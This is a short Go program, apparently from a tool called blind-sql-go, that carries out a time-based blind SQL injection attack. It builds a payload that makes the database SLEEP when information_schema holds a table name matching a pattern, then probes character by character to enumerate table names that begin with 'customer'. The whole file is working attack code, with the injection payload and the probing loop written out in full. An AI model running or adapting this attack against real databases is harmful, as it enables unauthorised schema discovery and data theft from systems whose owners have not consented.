package main

import (
	"fmt"
	"time"

	"github.com/remoschaer86/blind-sql-go/internal/attack"
)

func execSql(likestr string, sleep int) string {
	sc := fmt.Sprintf(`
	(SELECT
		CASE WHEN COUNT(*) > 0 THEN SLEEP(%d) ELSE SLEEP(0) END AS sleep_time
		FROM
	information_schema.tables
	WHERE table_name LIKE '%s')
`, sleep, likestr)
	return sc
}

func main() {

	const charset = "abcdefghijklmnopqrstuvwxyz_"

	tba := attack.NewTimeBasedAttack(charset, execSql, 3)

	prefix := "customer"

	for _, c := range charset {

		time.Sleep(time.Millisecond * 20)
		err := tba.Probe(prefix + string(c))

		if err != nil {
			panic(err)
		}
	}
}
